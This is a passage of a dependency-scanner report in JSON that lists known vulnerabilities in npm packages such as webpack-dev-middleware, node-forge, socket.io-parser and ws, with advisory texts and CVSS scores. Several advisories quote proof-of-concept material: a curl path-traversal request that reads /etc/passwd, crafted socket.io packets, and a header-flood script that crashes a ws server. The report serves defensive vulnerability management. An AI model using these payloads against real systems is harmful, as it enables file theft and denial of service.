via the name variable in parseQuery.js. This affects all versions prior to 1.4.1 and 2.0.3."},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 9.800000190734863,"security-severity": "9.800000190734863","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "HIGH","cvssv3_integrityImpact": "HIGH","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "CRITICAL","cvssv3_version": "_3_1","source": "OSSINDEX"}},{"id": "GHSA-3rfm-jhwj-7488","shortDescription": {"text": "high severity - GHSA-3rfm-jhwj-7488 Inefficient Regular Expression Complexity vulnerability in pkg:npm\/loader-utils@1.4.0"},"fullDescription": {"text": "A Regular expression denial of service (ReDoS) flaw was found in Function interpolateName in interpolateName.js in webpack loader-utils 2.0.0 via the url variable in interpolateName.js. A badly or maliciously formed string could be used to send crafted requests that cause a system to crash or take a disproportional amount of time to process. This issue has been patched in versions 1.4.2, 2.0.4 and 3.2.1."},"help": {"text": "","markdown": "For more information see [GHSA-3rfm-jhwj-7488](https://github.com/advisories/GHSA-3rfm-jhwj-7488)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.5,"security-severity": "7.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "NPM"}},{"id": "GHSA-wr3j-pwj9-hqq6","shortDescription": {"text": "high severity - GHSA-wr3j-pwj9-hqq6 Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') vulnerability in pkg:npm\/webpack-dev-middleware@5.3.0"},"fullDescription": {"text": "### Summary\n_The **webpack-dev-middleware** middleware does not validate the supplied URL address sufficiently before returning the local file. It is possible to access any file on the developer's machine._\n\n### Details\nThe middleware can either work with the physical filesystem when reading the files or it can use a virtualized in-memory _memfs_ filesystem.\nIf _writeToDisk_ configuration option is set to **true**, the physical filesystem is used:\n[https:\/\/github.com\/webpack\/webpack-dev-middleware\/blob\/7ed24e0b9f53ad1562343f9f517f0f0ad2a70377\/src\/utils\/setupOutputFileSystem.js#L21](https:\/\/github.com\/webpack\/webpack-dev-middleware\/blob\/7ed24e0b9f53ad1562343f9f517f0f0ad2a70377\/src\/utils\/setupOutputFileSystem.js#L21)\n\nThe _**getFilenameFromUrl**_ method is used to parse URL and build the local file path.\nThe public path prefix is stripped from the URL, and the **unsecaped** path suffix is appended to the _outputPath_:\n[https:\/\/github.com\/webpack\/webpack-dev-middleware\/blob\/7ed24e0b9f53ad1562343f9f517f0f0ad2a70377\/src\/utils\/getFilenameFromUrl.js#L82](https:\/\/github.com\/webpack\/webpack-dev-middleware\/blob\/7ed24e0b9f53ad1562343f9f517f0f0ad2a70377\/src\/utils\/getFilenameFromUrl.js#L82)\nAs the URL is not unescaped and normalized automatically before calling the midlleware, it is possible to use _%2e_ and _%2f_ sequences to perform path traversal attack.\n\n### PoC\n_A blank project can be created containing the following configuration file **webpack.config.js**:_\n`module.exports = {\n  devServer: {\n    devMiddleware: {\n      writeToDisk: true\n    }\n  }\n};\n`\n\nWhen started, it is possible to access any local file, e.g. _\/etc\/passwd_:\n`$ curl localhost:8080\/public\/..%2f..%2f..%2f..%2f..\/etc\/passwd`\n```\nroot:x:0:0:root:\/root:\/bin\/bash\ndaemon:x:1:1:daemon:\/usr\/sbin:\/usr\/sbin\/nologin\nbin:x:2:2:bin:\/bin:\/usr\/sbin\/nologin\nsys:x:3:3:sys:\/dev:\/usr\/sbin\/nologin\nsync:x:4:65534:sync:\/bin:\/bin\/sync\ngames:x:5:60:games:\/usr\/games:\/usr\/sbin\/nologin\n```\n\n### Impact\nThe developers using _webpack-dev-server_ or _webpack-dev-middleware_ are affected by the issue. When the project is started, an attacker might access any file on the developer's machine and exfiltrate the content (e.g. password, configuration files, private source code, ...).\n\nIf the development server is listening on a public IP address (or **0.0.0.0**), an attacker on the local network can access the local files without any interaction from the victim (direct connection to the port).\n\nIf the server allows access from third-party domains (CORS, **_Allow-Access-Origin: *_** ), an attacker can send a malicious link to the victim. When visited, the client side script can connect to the local server and exfiltrate the local files.\n\n### Recommendation\nThe URL should be unescaped and normalized before any further processing."},"help": {"text": "","markdown": "For more information see [GHSA-wr3j-pwj9-hqq6](https://github.com/advisories/GHSA-wr3j-pwj9-hqq6)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.400000095367432,"security-severity": "7.400000095367432","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "REQUIRED","cvssv3_scope": "CHANGED","cvssv3_confidentialityImpact": "HIGH","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "NONE","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "NPM"}},{"id": "GHSA-qwcr-r2fm-qrc7","shortDescription": {"text": "high severity - GHSA-qwcr-r2fm-qrc7 Asymmetric Resource Consumption (Amplification) vulnerability in pkg:npm\/body-parser@1.19.2"},"fullDescription": {"text": "### Impact\n\nbody-parser <1.20.3 is vulnerable to denial of service when url encoding is enabled. A malicious actor using a specially crafted payload could flood the server with a large number of requests, resulting in denial of service.\n\n### Patches\n\nthis issue is patched in 1.20.3\n\n### References\n"},"help": {"text": "","markdown": "For more information see [GHSA-qwcr-r2fm-qrc7](https://github.com/advisories/GHSA-qwcr-r2fm-qrc7)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.5,"security-severity": "7.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "NPM"}},{"id": "CVE-2022-24773","shortDescription": {"text": "medium severity - CVE-2022-24773 Improper Verification of Cryptographic Signature vulnerability in pkg:npm\/node-forge@1.2.1"},"fullDescription": {"text": "Forge (also called `node-forge`) is a native implementation of Transport Layer Security in JavaScript. Prior to version 1.3.0, RSA PKCS#1 v1.5 signature verification code does not properly check `DigestInfo` for a proper ASN.1 structure. This can lead to successful verification with signatures that contain invalid structures but a valid digest. The issue has been addressed in `node-forge` version 1.3.0. There are currently no known workarounds."},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 5.300000190734863,"security-severity": "5.300000190734863","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "LOW","cvssv3_availabilityImpact": "NONE","cvssv3_baseSeverity": "MEDIUM","cvssv3_version": "_3_1","source": "OSSINDEX"}},{"id": "GHSA-952p-6rrq-rcjv","shortDescription": {"text": "medium severity - GHSA-952p-6rrq-rcjv Inefficient Regular Expression Complexity vulnerability in pkg:npm\/micromatch@4.0.4"},"fullDescription": {"text": "The NPM package `micromatch` prior to version 4.0.8 is vulnerable to Regular Expression Denial of Service (ReDoS). The vulnerability occurs in `micromatch.braces()` in `index.js` because the pattern `.*` will greedily match anything. By passing a malicious payload, the pattern matching will keep backtracking to the input while it doesn't find the closing bracket. As the input size increases, the consumption time will also increase until it causes the application to hang or slow down. There was a merged fix but further testing shows the issue persisted prior to https:\/\/github.com\/micromatch\/micromatch\/pull\/266. This issue should be mitigated by using a safe pattern that won't start backtracking the regular expression due to greedy matching.\n"},"help": {"text": "","markdown": "For more information see [GHSA-952p-6rrq-rcjv](https://github.com/advisories/GHSA-952p-6rrq-rcjv)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 5.300000190734863,"security-severity": "5.300000190734863","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "LOW","cvssv3_baseSeverity": "MEDIUM","cvssv3_version": "_3_1","source": "NPM"}},{"id": "CVE-2022-24772","shortDescription": {"text": "high severity - CVE-2022-24772 Improper Verification of Cryptographic Signature vulnerability in pkg:npm\/node-forge@1.2.1"},"fullDescription": {"text": "Forge (also called `node-forge`) is a native implementation of Transport Layer Security in JavaScript. Prior to version 1.3.0, RSA PKCS#1 v1.5 signature verification code does not check for tailing garbage bytes after decoding a `DigestInfo` ASN.1 structure. This can allow padding bytes to be removed and garbage data added to forge a signature when a low public exponent is being used. The issue has been addressed in `node-forge` version 1.3.0. There are currently no known workarounds."},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.5,"security-severity": "7.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "HIGH","cvssv3_availabilityImpact": "NONE","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "OSSINDEX"}},{"id": "CVE-2024-55565","shortDescription": {"text": "medium severity - CVE-2024-55565 Loop with Unreachable Exit Condition ('Infinite Loop') vulnerability in pkg:npm\/nanoid@3.3.1"},"fullDescription": {"text": "nanoid (aka Nano ID) before 5.0.9 mishandles non-integer values. 3.3.8 is also a fixed version."},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv2_score": 6.900000095367432,"cvssv2_accessVector": "NETWORK","cvssv2_accessComplexity": "LOW","cvssv2_authenticationr": "$enc.json($rule.cvssv2Authentication)","cvssv2_confidentialityImpact": "$enc.json($rule.cvssv2ConfidentialityImpact)","cvssv2_integrityImpact": "$enc.json($rule.cvssv2IntegrityImpact)","cvssv2_availabilityImpact": "$enc.json($rule.cvssv2AvailabilityImpact)","cvssv2_severity": "MEDIUM","source": "OSSINDEX"}},{"id": "CVE-2022-24771","shortDescription": {"text": "high severity - CVE-2022-24771 Improper Verification of Cryptographic Signature vulnerability in pkg:npm\/node-forge@1.2.1"},"fullDescription": {"text": "Forge (also called `node-forge`) is a native implementation of Transport Layer Security in JavaScript. Prior to version 1.3.0, RSA PKCS#1 v1.5 signature verification code is lenient in checking the digest algorithm structure. This can allow a crafted structure that steals padding bytes and uses unchecked portion of the PKCS#1 encoded message to forge a signature when a low public exponent is being used. The issue has been addressed in `node-forge` version 1.3.0. There are currently no known workarounds."},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.5,"security-severity": "7.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "HIGH","cvssv3_availabilityImpact": "NONE","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "OSSINDEX"}},{"id": "GHSA-qm95-pgcg-qqfq","shortDescription": {"text": "critical severity - GHSA-qm95-pgcg-qqfq Improper Validation of Specified Type of Input vulnerability in pkg:npm\/socket.io-parser@4.0.4"},"fullDescription": {"text": "Due to improper type validation in the `socket.io-parser` library (which is used by the `socket.io` and `socket.io-client` packages to encode and decode Socket.IO packets), it is possible to overwrite the _placeholder object which allows an attacker to place references to functions at arbitrary places in the resulting query object.\n\nExample:\n\n```js\nconst decoder = new Decoder();\n\ndecoder.on(\"decoded\", (packet) => {\n console.log(packet.data); \/\/ prints [ 'hello', [Function: splice] ]\n})\n\ndecoder.add('51-[\"hello\",{\"_placeholder\":true,\"num\":\"splice\"}]');\ndecoder.add(Buffer.from(\"world\"));\n```\n\nThis bubbles up in the `socket.io` package:\n\n```js\nio.on(\"connection\", (socket) => {\n socket.on(\"hello\", (val) => {\n \/\/ here, \"val\" could be a function instead of a buffer\n });\n});\n```\n\n:warning: IMPORTANT NOTE :warning:\n\nYou need to make sure that the payload that you received from the client is actually a `Buffer` object:\n\n```js\nio.on(\"connection\", (socket) => {\n socket.on(\"hello\", (val) => {\n if (!Buffer.isBuffer(val)) {\n socket.disconnect();\n return;\n }\n \/\/ ...\n });\n});\n```\n\n**If that's already the case, then you are not impacted by this issue, and there is no way an attacker could make your server crash (or escalate privileges, ...).**\n\nExample of values that could be sent by a malicious user:\n\n- a number that is out of bounds\n\nSample packet: `451-[\"hello\",{\"_placeholder\":true,\"num\":10}]`\n\n```js\nio.on(\"connection\", (socket) => {\n socket.on(\"hello\", (val) => {\n \/\/ val is `undefined`\n });\n});\n```\n\n- a value that is not a number, like `undefined`\n\nSample packet: `451-[\"hello\",{\"_placeholder\":true,\"num\":undefined}]`\n\n```js\nio.on(\"connection\", (socket) => {\n socket.on(\"hello\", (val) => {\n \/\/ val is `undefined`\n });\n});\n```\n\n- a string that is part of the prototype of `Array`, like \"push\"\n\nSample packet: `451-[\"hello\",{\"_placeholder\":true,\"num\":\"push\"}]`\n\n```js\nio.on(\"connection\", (socket) => {\n socket.on(\"hello\", (val) => {\n \/\/ val is a reference to the \"push\" function\n });\n});\n```\n\n- a string that is part of the prototype of `Object`, like \"hasOwnProperty\"\n\nSample packet: `451-[\"hello\",{\"_placeholder\":true,\"num\":\"hasOwnProperty\"}]`\n\n```js\nio.on(\"connection\", (socket) => {\n socket.on(\"hello\", (val) => {\n \/\/ val is a reference to the \"hasOwnProperty\" function\n });\n});\n```\n\nThis should be fixed by:\n\n- https:\/\/github.com\/socketio\/socket.io-parser\/commit\/b5d0cb7dc56a0601a09b056beaeeb0e43b160050, included in `socket.io-parser@4.2.1`\n- https:\/\/github.com\/socketio\/socket.io-parser\/commit\/b559f050ee02bd90bd853b9823f8de7fa94a80d4, included in `socket.io-parser@4.0.5`\n- https:\/\/github.com\/socketio\/socket.io-parser\/commit\/04d23cecafe1b859fb03e0cbf6ba3b74dff56d14, included in `socket.io-parser@3.4.2`\n- https:\/\/github.com\/socketio\/socket.io-parser\/commit\/fb21e422fc193b34347395a33e0f625bebc09983, included in `socket.io-parser@3.3.3`\n\n### Dependency analysis for the `socket.io` package\n\n| `socket.io` version | `socket.io-parser` version | Covered? |\n|---------------------|---------------------------------------------------------------------------------------------------------|------------------------|\n| `4.5.2...latest` | `~4.2.0` ([ref](https:\/\/github.com\/socketio\/socket.io\/commit\/9890b036cf942f6b6ad2afeb6a8361c32cd5d528)) | Yes :heavy_check_mark: |\n| `4.1.3...4.5.1` | `~4.0.4` ([ref](https:\/\/github.com\/socketio\/socket.io\/commit\/7c44893d7878cd5bba1eff43150c3e664f88fb57)) | Yes :heavy_check_mark: |\n| `3.0.5...4.1.2` | `~4.0.3` ([ref](https:\/\/github.com\/socketio\/socket.io\/commit\/752dfe3b1e5fecda53dae899b4a39e6fed5a1a17)) | Yes :heavy_check_mark: |\n| `3.0.0...3.0.4` | `~4.0.1` ([ref](https:\/\/github.com\/socketio\/socket.io\/commit\/1af3267e3f5f7884214cf2ca4d5282d620092fb0)) | Yes :heavy_check_mark: |\n| `2.3.0...2.5.0` | `~3.4.0` ([ref](https:\/\/github.com\/socketio\/socket.io\/commit\/cf39362014f5ff13a17168b74772c43920d6e4fd)) | Yes :heavy_check_mark: |\n\n\n### Dependency analysis for the `socket.io-client` package\n\n| `socket.io-client` version | `socket.io-parser` version | Covered? |\n|----------------------------|----------------------------------------------------------------------------------------------------------------|------------------------------------|\n| `4.5.0...latest` | `~4.2.0` ([ref](https:\/\/github.com\/socketio\/socket.io-client\/commit\/b862924b7f1720979e5db2f0154906b305d420e3)) | Yes :heavy_check_mark: |\n| `4.3.0...4.4.1` | `~4.1.1` ([ref](https:\/\/github.com\/socketio\/socket.io-client\/commit\/91b948b8607166fcc79f028a6428819277214188)) | No, but the impact is very limited |\n| `3.1.0...4.2.0` | `~4.0.4` ([ref](https:\/\/github.com\/socketio\/socket.io-client\/commit\/5d9b4eb42b1f5778e6f033096694acb331b132c4)) | Yes :heavy_check_mark: |\n| `3.0.5` | `~4.0.3` ([ref](https:\/\/github.com\/socketio\/socket.io-client\/commit\/cf9fc358365cc15a41260a51dc186c881bf086ca)) | Yes :heavy_check_mark: |\n| `3.0.0...3.0.4` | `~4.0.1` ([ref](https:\/\/github.com\/socketio\/socket.io-client\/commit\/b7e07ba633ceb9c1dc94cc894c10b9bfca536c7a)) | Yes :heavy_check_mark: |\n| `2.2.0...2.5.0` | `~3.3.0` ([ref](https:\/\/github.com\/socketio\/socket.io-client\/commit\/06e9a4ca2621176c30c352b2ba8b34fa42b8d0ba)) | Yes :heavy_check_mark: |\n"},"help": {"text": "","markdown": "For more information see [GHSA-qm95-pgcg-qqfq](https://github.com/advisories/GHSA-qm95-pgcg-qqfq)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 9.800000190734863,"security-severity": "9.800000190734863","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "HIGH","cvssv3_integrityImpact": "HIGH","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "CRITICAL","cvssv3_version": "_3_1","source": "NPM"}},{"id": "GHSA-3h5v-q93c-6h6q","shortDescription": {"text": "high severity - GHSA-3h5v-q93c-6h6q NULL Pointer Dereference vulnerability in pkg:npm\/ws@8.2.3"},"fullDescription": {"text": "### Impact\n\nA request with a number of headers exceeding the[`server.maxHeadersCount`][] threshold could be used to crash a ws server.\n\n### Proof of concept\n\n```js\nconst http = require('http');\nconst WebSocket = require('ws');\n\nconst wss = new WebSocket.Server({ port: 0 }, function () {\n  const chars = \"!#$%&'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~\".split('');\n  const headers = {};\n  let count = 0;\n\n  for (let i = 0; i < chars.length; i++) {\n    if (count === 2000) break;\n\n    for (let j = 0; j < chars.length; j++) {\n      const key = chars[i] + chars[j];\n      headers[key] = 'x';\n\n      if (++count === 2000) break;\n    }\n  }\n\n  headers.Connection = 'Upgrade';\n  headers.Upgrade = 'websocket';\n  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';\n  headers['Sec-WebSocket-Version'] = '13';\n\n  const request = http.request({\n    headers: headers,\n    host: '127.0.0.1',\n    port: wss.address().port\n  });\n\n  request.end();\n});\n```\n\n### Patches\n\nThe vulnerability was fixed in ws@8.17.1 (https:\/\/github.com\/websockets\/ws\/commit\/e55e5106f10fcbaac37cfa89759e4cc0d073a52c) and backported to ws@7.5.10 (https:\/\/github.com\/websockets\/ws\/commit\/22c28763234aa75a7e1b76f5c01c181260d7917f), ws@6.2.3 (https:\/\/github.com\/websockets\/ws\/commit\/eeb76d313e2a00dd5247ca3597bba7877d064a63), and ws@5.2.4 (https:\/\/github.com\/websockets\/ws\/commit\/4abd8f6de4b0b65ef80b3ff081989479ed93377e)\n\n### Workarounds\n\nIn vulnerable versions of ws, the issue can be mitigated in the following ways:\n\n1. Reduce the maximum allowed length of the request headers using the [`--max-http-header-size=size`][] and\/or the [`maxHeaderSize`][] options so that no more headers than the `server.maxHeadersCount` limit can be sent.\n2. Set `server.maxHeadersCount` to `0` so that no limit is applied.\n\n### Credits\n\nThe vulnerability was reported by [Ryan LaPointe](https:\/\/github.com\/rrlapointe) in https:\/\/github.com\/websockets\/ws\/issues\/2230.\n\n### References\n\n- https:\/\/github.com\/websockets\/ws\/issues\/2230\n- https:\/\/github.com\/websockets\/ws\/pull\/2231\n\n[`--max-http-header-size=size`]: https:\/\/nodejs.org\/api\/cli.html#--max-http-header-sizesize\n[`maxHeaderSize`]: https:\/\/nodejs.org\/api\/http.html#httpcreateserveroptions-requestlistener\n[`server.maxHeadersCount`]: https:\/\/nodejs.org\/api\/http.html#servermaxheaderscount\n"},"help": {"text": "","markdown": "For more information see [GHSA-3h5v-q93c-6h6q](https://github.com/advisories/GHSA-3h5v-q93c-6h6q)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.5,"security-severity": "7.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "NPM"}},{"id": "GHSA-m6fv-jmcg-4jfg","shortDescription": {"text": "low severity - GHSA-m6fv-jmcg-4jfg Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in pkg:npm\/send@0.17.2"},"fullDescription": {"text": "### Impact\n\npassing untrusted user input - even after sanitizing it - to `SendStream.redirect()` may execute untrusted code\n\n### Patches\n\nthis issue is patched in send 0.19.0\n\n### Workarounds\n\nusers are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist\n\n### Details\n\nsuccessful exploitation of this vector requires the following:\n\n1. The attacker MUST control the input to response.redirect()\n1. express MUST NOT redirect before the template appears\n1. the browser MUST NOT complete redirection before:\n1. the user MUST click on the link in the template\n"},"help": {"text": "","markdown": "For more information see [GHSA-m6fv-jmcg-4jfg](https://github.com/advisories/GHSA-m6fv-jmcg-4jfg)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 5.0,"security-severity": "5.0","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "HIGH","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "REQUIRED","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "LOW","cvssv3_integrityImpact": "LOW","cvssv3_availabilityImpact": "LOW","cvssv3_baseSeverity": "MEDIUM","cvssv3_version": "_3_1","source": "NPM"}},{"id": "GHSA-x4jg-mjrx-434g","shortDescription": {"text": "high severity - GHSA-x4jg-mjrx-434g Improper Verification of Cryptographic Signature vulnerability in pkg:npm\/node-forge@1.2.1"},"fullDescription": {"text": "### Impact\n\nRSA PKCS#1 v1.5 signature verification code does not check for tailing garbage bytes after decoding a `DigestInfo` ASN.1 structure. This can allow padding bytes to be removed and garbage data added to forge a signature when a low public exponent is being used.\n\n### Patches\n\nThe issue has been addressed in `node-forge` `1.3.0`.\n\n### References\n\nFor more information, please see\n[\"Bleichenbacher's RSA signature forgery based on implementation error\"](https:\/\/mailarchive.ietf.org\/arch\/msg\/openpgp\/5rnE9ZRN1AokBVj3VqblGlP63QE\/)\nby Hal Finney.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [forge](https:\/\/github.com\/digitalbazaar\/forge)\n* Email us at [example email address](mailto:security@digitalbazaar.com)"},"help": {"text": "","markdown": "For more information see [GHSA-x4jg-mjrx-434g](https://github.com/advisories/GHSA-x4jg-mjrx-434g)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.5,"security-severity": "7.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "HIGH","cvssv3_availabilityImpact": "NONE","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "NPM"}},{"id": "CVE-2022-2421","shortDescription": {"text": "critical severity - CVE-2022-2421 Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') vulnerability in pkg:npm\/socket.io-parser@4.0.4"},"fullDescription": {"text": "Due to improper type validation in attachment parsing the Socket.io js library, it is possible to overwrite the _placeholder object which allows an attacker to place references to functions at arbitrary places in the resulting query object."},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 9.800000190734863,"security-severity": "9.800000190734863","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "HIGH","cvssv3_integrityImpact": "HIGH","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "CRITICAL","cvssv3_version": "_3_1","source": "OSSINDEX"}},{"id": "GHSA-9jgg-88mc-972h","shortDescription": {"text": "medium severity - GHSA-9jgg-88mc-972h Origin Validation Error vulnerability in pkg:npm\/webpack-dev-server@4.7.3"},"fullDescription": {"text": "### Summary\nSource code may be stolen when you access a malicious web site with non-Chromium based browser.\n\n### Details\nThe `Origin` header is checked to prevent Cross-site WebSocket hijacking from happening which was reported by CVE-2018-14732.\nBut webpack-dev-server always allows IP address `Origin` headers.\nhttps:\/\/github.com\/webpack\/webpack-dev-server\/blob\/55220a800ba4e30dbde2d98785ecf4c80b32f711\/lib\/Server.js#L3113-L3127\nThis allows websites that are served on IP addresses to connect WebSocket.\nBy using the same method described in [the article](https:\/\/blog.cal1.cn\/post\/Sniffing%20Codes%20in%20Hot%20Module%20Reloading%20Messages) linked from CVE-2018-14732, the attacker get the source code.\n\nrelated commit: https:\/\/github.com\/webpack\/webpack-dev-server\/commit\/72efaab83381a0e1c4914adf401cbd210b7de7eb (note that `checkHost` function was only used for Host header to prevent DNS rebinding attacks so this change itself is fine.\n\nThis vulnerability does not affect Chrome 94+ (and other Chromium based browsers) users due to [the non-HTTPS private access blocking feature](https:\/\/developer.chrome.com\/blog\/private-network-access-update#chrome_94).\n\n### PoC\n1. 